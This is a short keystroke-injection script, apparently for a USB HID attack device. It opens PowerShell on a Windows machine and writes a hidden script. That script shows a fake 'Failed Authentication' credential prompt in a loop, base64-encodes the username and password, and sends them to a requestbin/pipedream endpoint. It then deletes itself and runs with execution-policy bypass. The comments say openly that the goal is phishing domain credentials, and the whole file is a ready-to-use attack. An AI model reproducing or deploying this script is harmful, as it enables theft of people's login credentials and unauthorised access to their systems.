// Creates a fake windows authentication prompt for phishing user domain credentials
// Generates a get request with an encoded base64 string
// You can use a free service like https://requestbin.com/ to capture requests

// Change to your server logger address, use HTTP only, HTTPS is not working properly
// You can use this public bin for testing: https://requestbin.com/r/enemdzl11o27

var URL = "http://enemdzl11o27.x.pipedream.net"

layout('us')			
press("GUI r")
delay(500);
type("powershell\n")
delay(500)
type("$popup = \"while (`$true){`$cred = `$host.ui.promptforcredential(`'Failed Authentication`',`'`',[Environment]::UserDomainName + `\"\\`\" + [Environment]::UserName,[Environment]::UserDomainName);[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true};if (`$cred.getnetworkcredential().password) {break :DoLoop}};`$Text = `$cred.username + `\":`\" + `$cred.getnetworkcredential().password;`$Bytes = [System.Text.Encoding]::Unicode.GetBytes(`$Text);`$EncodedText =[Convert]::ToBase64String(`$Bytes);Invoke-WebRequest -UseBasicParsing -Uri " + URL + "/`$EncodedText; rm $Env:UserProfile\\popup.ps1\"\n")
delay(500)
type("echo $popup > $Env:UserProfile\\popup.ps1\n")
delay(1000)
type("powershell.exe -Exec Bypass -windowstyle hidden $Env:UserProfile\\popup.ps1\n")
